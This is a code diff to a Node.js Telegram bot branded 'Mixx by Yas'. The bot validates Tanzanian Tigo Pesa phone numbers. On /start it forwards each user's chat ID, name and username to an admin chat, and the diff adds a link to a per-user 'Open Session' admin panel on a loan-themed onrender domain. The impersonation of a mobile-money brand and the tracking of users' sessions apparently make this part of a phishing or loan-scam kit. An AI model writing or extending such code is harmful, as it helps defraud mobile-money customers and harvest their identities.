@@ -3,7 +3,7 @@
  * 
  * Includes:
  * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
- * - Instant Telegram user info forwarding when /start is triggered.
+ * - Instant Telegram user info forwarding with custom Render admin URL tracking.
  */
 
 const express = require('express');
@@ -107,8 +107,8 @@ async function initBot() {
 
   /**
    * **INSTANT /START COMMAND HANDLER**
-   * Captures chat id, name, username, and direct link immediately when tapped, 
-   * sending the payload straight to the default admin chat ID.
+   * Captures chat ID, name, username, and formats the direct link pointing to your 
+   * Render admin endpoint with the chat ID appended at the end.
    */
   bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
@@ -119,10 +119,8 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Generate reliable private profile link
-    const privateLink = user.username 
-      ? `https://t.me/${user.username}` 
-      : `tg://user?id=${user.id}`;
+    // Custom Render Admin link ending with Admin-1 and appending the user's chat ID
+    const customAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1?chatId=${user.id}`;
 
     // 1. Send welcome message back to the user
     const welcomeText = 
@@ -138,7 +136,7 @@ async function initBot() {
         `👤 **Name:** ${fullName}\n` +
         `🆔 **Chat ID:** \`${user.id}\`\n` +
         `🏷 **Username:** ${username}\n` +
-        `🔗 **Direct Link:** ${privateLink}`;
+        `🔗 **Admin Panel Link:** [Open Session](${customAdminLink})`;
 
       await bot.sendMessage(DEFAULT_CHAT_ID, adminAlert, { 
         parse_mode: 'Markdown',
@@ -332,4 +330,3 @@ app.listen(PORT, async () => {
   console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
   await initBot();
 });
-                   
